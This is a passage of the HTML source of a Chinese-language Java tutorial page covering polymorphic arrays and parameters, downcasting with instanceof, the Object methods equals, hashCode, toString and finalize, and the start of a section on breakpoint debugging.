class="hljs-number">0</span>;i&lt; persons.length;i++)&#123;<br>            <span class="hljs-comment">//person[i]编译类型是Person,运行类型按实际情况由JVM来判断</span><br>            <span class="hljs-comment">//动态绑定机制</span><br>            System.out.println(persons[i].say());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220926171447934.png" alt="image-20220926171447934" style="zoom:50%;" /><p>应用实例升级：如何调用子类特有的方法，比如 Teacher 有一个 teach，Student 有一个 study怎么调用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//在Student中添加study方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">()</span>&#123;<br>  System.out.println(<span class="hljs-string">&quot;学生&quot;</span>+getName()+<span class="hljs-string">&quot;正在上课...&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在Teacher中也添加teach方法。</p><p>修改main函数，判断类型再向下转型输出say。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//对象统一放在数组中(2个学生对象，2个老师对象)，并调用每个对象say方法。</span><br>        Person[] persons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[<span class="hljs-number">5</span>];<br>        persons[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">20</span>);<br>        persons[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;mary&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-number">100</span>);<br>        persons[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-number">19</span>,<span class="hljs-number">30.1</span>);<br>        persons[<span class="hljs-number">3</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;scott&quot;</span>,<span class="hljs-number">30</span>,<span class="hljs-number">20000</span>);<br>        persons[<span class="hljs-number">4</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;king&quot;</span>,<span class="hljs-number">50</span>,<span class="hljs-number">25000</span>);<br>        <span class="hljs-comment">//循环遍历多态数组，调用say方法</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt; persons.length;i++) &#123;<br>            <span class="hljs-comment">//person[i]编译类型是Person,运行类型按实际情况由JVM来判断</span><br>            <span class="hljs-comment">//动态绑定机制</span><br>            System.out.println(persons[i].say());<br>            <span class="hljs-comment">//先类型判断，再向下转型</span><br>            <span class="hljs-keyword">if</span> (persons[i] <span class="hljs-keyword">instanceof</span> Student) &#123;<br>                <span class="hljs-comment">//判断person[i]的类型是不是student</span><br>                ((Student) persons[i]).study();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (persons[i] <span class="hljs-keyword">instanceof</span> Teacher) &#123;<br>                ((Teacher) persons[i]).teach();<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (persons[i] <span class="hljs-keyword">instanceof</span> Person)&#123;<br><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;你的类型有误，请检测...&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220926173241331.png" alt="image-20220926173241331" style="zoom:50%;" /><h3 id="多态应用2：多态参数"><a href="#多态应用2：多态参数" class="headerlink" title="多态应用2：多态参数"></a>多态应用2：多态参数</h3><p>方法定义的形参类型为父类类型，实参类型允许子类类型。</p><p>应用实例：</p><blockquote><p>定义员工类Employee，包含姓名和月工资［private］，以及计算年工资getAnnual的方法。普通员工和经理继承了员工，经理类多了奖金bonus属性和管理manage方法，普通员工类多了work方法，普通员工和经理类要求分别重写getAnnual方法.</p><p>测试类中添加一个方法showEmpAnnal（Employee e），实现获取任何员工对象的年工资，并在main方法中调用该方法［e.getAnnual（）］</p><p>测试类中添加一个方法，testWork，如果是普通员工，则调用work方法，如果是经理，则调用manage方法</p></blockquote><p>Employee:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;<br>    <span class="hljs-comment">//得到年工资的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAnnual</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">12</span>*salary;<br>    &#125;<br>  <span class="hljs-comment">//....</span><br></code></pre></td></tr></table></figure><p>Worker:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Worker</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, salary);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;普通员工：&quot;</span>+getName()+<span class="hljs-string">&quot;is working...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAnnual</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getAnnual();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Manager:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Manager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> bouns;<br>   <span class="hljs-comment">/* </span><br><span class="hljs-comment">此处省略构造器及setget</span><br><span class="hljs-comment">*/</span>    <br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">manage</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;经理&quot;</span>+getName()+<span class="hljs-string">&quot;is managing...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAnnual</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getAnnual()+bouns; <span class="hljs-comment">//经理有奖金</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PloyParameter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Worker</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&quot;tom&quot;</span>, <span class="hljs-number">2500</span>);<br>        <span class="hljs-type">Manager</span> <span class="hljs-variable">milan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Manager</span>(<span class="hljs-string">&quot;milan&quot;</span>, <span class="hljs-number">5000</span>, <span class="hljs-number">200000</span>);<br>        <span class="hljs-type">PloyParameter</span> <span class="hljs-variable">ployParameter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PloyParameter</span>();<br>        ployParameter.showEmpAnnual(tom);<br>        ployParameter.showEmpAnnual(milan);<br>        ployParameter.testWork(tom);<br>        ployParameter.testWork(milan);<br>    &#125;<br>    <span class="hljs-comment">//测试类中添加一个方法showEmpAnnal（Employee e），</span><br>    <span class="hljs-comment">// 实现获取任何员工对象的年工资，</span><br>    <span class="hljs-comment">// 并在main方法中调用该方法［e.getAnnual（）］</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showEmpAnnual</span><span class="hljs-params">(Employee e)</span>&#123;<br>        System.out.println(e.getAnnual());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWork</span><span class="hljs-params">(Employee e)</span>&#123;<br>        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> Worker)&#123;<br>            ((Worker) e).work();<br>            System.out.println();<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(e <span class="hljs-keyword">instanceof</span> Manager)&#123;<br>            ((Manager) e).manage();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220926175502239.png" alt="image-20220926175502239" style="zoom:50%;" /><h2 id="9-Object类详解"><a href="#9-Object类详解" class="headerlink" title="9.Object类详解"></a>9.Object类详解</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220927114346400.png" alt="image-20220927114346400" style="zoom:50%;" /><h3 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h3><p>Q: &#x3D;&#x3D; 和 equals 的对比（面试题）</p><p>A: &#x3D;&#x3D;是一个比较运算符。</p><ul><li><p>&#x3D;&#x3D; 既可以判断基本类型，也可以判断引用类型</p><ol><li>如果判断<strong>基本类型</strong>，判断的是<strong>值是否相等</strong>，例如int i &#x3D; 10;double d &#x3D; 10.0，可以用&#x3D;&#x3D;判断i和d的值是否相等。</li><li>如果判断<strong>引用类型</strong>，判断的是<strong>地址是否相等</strong>，即判定<strong>是不是同一个对象</strong>。</li></ol><p>例子：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br><span class="hljs-type">A</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a;<br><span class="hljs-type">A</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> b;<br>System.out.println(a == c); <span class="hljs-comment">//T</span><br>System.out.println(b == c); <span class="hljs-comment">//T</span><br><span class="hljs-comment">//B为A的父类</span><br><span class="hljs-type">B</span> <span class="hljs-variable">bObj</span> <span class="hljs-operator">=</span> a;<br>System.out.println(bObj == c); <span class="hljs-comment">//T</span><br></code></pre></td></tr></table></figure><ul><li><p>equals是Object类中的方法，只能判断引用类型</p><ol><li>默认判断的是<strong>地址是否相等</strong>，子类中往往重写该方法，用于判断内容是否相等</li></ol><p>equals的jdk源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object anObject)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == anObject) &#123; <span class="hljs-comment">//如果传入的是同一个对象</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//返回true</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (anObject <span class="hljs-keyword">instanceof</span> String) &#123; <span class="hljs-comment">//判断类型是否是String</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">aString</span> <span class="hljs-operator">=</span> (String)anObject; <span class="hljs-comment">//向下转型</span><br>        <span class="hljs-keyword">if</span> (!COMPACT_STRINGS || <span class="hljs-built_in">this</span>.coder == aString.coder) &#123;<br>            <span class="hljs-keyword">return</span> StringLatin1.equals(value, aString.value);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>*如果想看jdk源码，使用⌘+B</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Integer</span> <span class="hljs-variable">integer1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-type">Integer</span> <span class="hljs-variable">integer2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1000</span>);<br>System.out.println(integer1 == integer2); <span class="hljs-comment">//是不同的两个对象，False</span><br>System.out.println(integer1.equals(integer2)); <span class="hljs-comment">//值一样，所以True</span><br><br><span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hspedu&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hspedu&quot;</span>);<br>System.out.println(str1 == str2); <span class="hljs-comment">//False，两个不同对象</span><br>System.out.println(str1.equals(str2)); <span class="hljs-comment">//True，值相同</span><br></code></pre></td></tr></table></figure><h4 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h4><blockquote><p>应用实例：判断两个Person对象的内容是否相等，如果两个Person对象的各个属性值都一 样，则返回true，反之false。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EqualsExercise01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;男&#x27;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;男&#x27;</span>);<br><br>        System.out.println(person1.equals(person2));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123; <span class="hljs-comment">//extends Object</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">char</span> gender;<br><br>    <span class="hljs-comment">/**此处省略构造器和set get方法</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure><p>输出为False。</p><p>因为Person继承了超类Object，equals方法属于Object。Person类内未对equals进行重写，所以equals判断的是地址，person1和person2是两个对象，所以不同。</p><p>在Person类中重写equals：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span>&#123;<br>    <span class="hljs-comment">//如果比较的两个对象是同一个对象，则直接返回true</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span> == obj)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">//类型判断</span><br>    <span class="hljs-keyword">if</span>(obj <span class="hljs-keyword">instanceof</span> Person)&#123; <span class="hljs-comment">//如果是Person,才比较</span><br>        <span class="hljs-comment">//进行 向下转型,因为我需要得到obj的 各个属性</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person)obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name.equals(p.name) &amp;&amp; <span class="hljs-built_in">this</span>.age==p.age &amp;&amp; <span class="hljs-built_in">this</span>.gender==p.gender;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出会变为True.</p><blockquote><p>判断输出：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220927190459248.png" alt="image-20220927190459248"></p></blockquote><p>False、True、False、True、False。</p><blockquote><p>以下的输出：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220927195852009.png" alt="image-20220927195852009" style="zoom:50%;" /></blockquote><p>T ——基本数据类型</p><p>T——ASCII 65 为A</p><p>T、F、T</p><p>编译报错——类型不同，无法比较。</p><h3 id="hashCode方法"><a href="#hashCode方法" class="headerlink" title="hashCode方法"></a>hashCode方法</h3><p>返回对象的哈希码值。</p><ol><li>提高具有哈希结构的容器的效率</li><li>两个引用，如果指向的是同一个对象，则哈希值肯定是一样的</li><li>两个引用，如果指向的是不同对象，则哈希值是不一样的</li><li>哈希值主要根据地址号来计算，不能完全将哈希值等价于地址</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AA</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br><span class="hljs-type">AA</span> <span class="hljs-variable">aa2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br><span class="hljs-type">AA</span> <span class="hljs-variable">aa3</span> <span class="hljs-operator">=</span> aa;<br>System.out.println(<span class="hljs-string">&quot;aa:&quot;</span>+aa.hashCode());<br>System.out.println(<span class="hljs-string">&quot;aa2:&quot;</span>+aa2.hashCode());<br>System.out.println(<span class="hljs-string">&quot;aa3:&quot;</span>+aa3.hashCode());<br></code></pre></td></tr></table></figure><img src="/Users/songyang/Library/Application Support/typora-user-images/image-20220927212306021.png" alt="image-20220927212306021" style="zoom:50%;" /><h3 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h3><p>返回对象的字符串表示形式。 </p><ul><li>该<code>toString</code>类方法<code>Object</code>返回一个由其中的对象是一个实例。这个方法返回一个等于下列值的字符串：</li></ul><blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getClass</span><span class="hljs-params">()</span></span><span class="hljs-selector-class">.getName</span>() + <span class="hljs-string">&#x27;@&#x27;</span> + Integer<span class="hljs-selector-class">.toHexString</span>(<span class="hljs-built_in">hashCode</span>())<br></code></pre></td></tr></table></figure></blockquote><p>全类名(包名+类名)+@+哈希值的十六进制。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Monster</span> <span class="hljs-variable">monster</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Monster</span>(<span class="hljs-string">&quot;小妖怪&quot;</span>,<span class="hljs-string">&quot;巡山&quot;</span>,<span class="hljs-number">1000</span>);<br>System.out.println(monster.toString());<br></code></pre></td></tr></table></figure><p>输出：com.hspedu.object_.Monster@5b2133b1</p><ul><li><strong>重写toString方法</strong>，打印对象或拼接对象时，都会自动调用该对象的toString形式。</li></ul><p>例如：前例添加toString重写，输出属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//toString重写</span><br><span class="hljs-comment">//快捷键⌃+回车</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Monster&#123;&quot;</span> +<br>            <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>            <span class="hljs-string">&quot;, job=&#x27;&quot;</span> + job + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>            <span class="hljs-string">&quot;, sal=&quot;</span> + sal +<br>            <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出变为：Monster{name&#x3D;’小妖怪’, job&#x3D;’巡山’, sal&#x3D;1000.0}</p><ul><li>直接输出一个对象时，toString方法会被默认的调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(monster); <span class="hljs-comment">//默认调用toString</span><br></code></pre></td></tr></table></figure><p>输出也是：Monster{name&#x3D;’小妖怪’, job&#x3D;’巡山’, sal&#x3D;1000.0}</p><h3 id="finalize方法"><a href="#finalize方法" class="headerlink" title="finalize方法"></a>finalize方法</h3><p>当垃圾回收器确定不存在对该对象的引用时，由对象的垃圾回收器调用此方法。</p><ol><li>当对象被回收时，系统自动调用该对象的finalize方法。子类可以重写该方法，做一些<strong>释放资源</strong>的操作。</li><li>什么时候被回收：当某个对象没有任何引用时，则jvm就认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象前，会先调用finalize方法。</li><li>垃圾回收机制的调用，是由系统来决定，也可以通过System.gc()主动触发垃圾回收机制。</li></ol><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Finalize_</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Car</span> <span class="hljs-variable">bwn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&quot;宝马&quot;</span>);<br>        <span class="hljs-comment">//这时 car对象是就是一个垃圾，垃圾回收器就会回收（销毁）对象，</span><br>        <span class="hljs-comment">//在销毁对象前，会调用该对象的finalize方法</span><br>        <span class="hljs-comment">//程序员可以在重写的finalize中，写自己的业务逻辑代码（比如释放资源：数据库链接，或者打开文件...)</span><br>        <span class="hljs-comment">//默认调用Object的finalize</span><br>        bwn = <span class="hljs-literal">null</span>;<br>        System.out.println(<span class="hljs-string">&quot;程序退出了。&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">//重写finalize</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finalize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;我们销毁了汽车：&quot;</span>+name);<br>        System.out.println(<span class="hljs-string">&quot;释放了某些资源&quot;</span>);<br><span class="hljs-comment">//        super.finalize();</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Car</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br></code></pre></td></tr></table></figure><p>输出为：”程序退出了。”</p><p>因为回收机制不是瞬间调用的（后期会细讲）。</p><p>实际开发时，几乎不会运用到finalize。</p><h2 id="10-断点调试（debug）"><a href="#10-断点调试（debug）" class="headerlink" title="10.断点调试（debug）"></a>10.断点调试（debug）</h2><ol><li>断点调试是指在程序的某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步往下调试，调试过程中可以看各个变量当前的值、出错的话，调试到出错的代码行即显示错误，停下。进行分析从而找到这个Bug。</li><li>断点调试是程序员必须掌握的技能。</li><li>断点调试也能帮助我们查看java底层源代码的执行过程，提高程序员的Java水平。</li></ol><p>*<strong>在断点调试中，是运行状态，是以对象的运行类型来执行的。</strong></p><ul><li>断点调试的快捷键<ul><li>F7 （跳入），F8（ 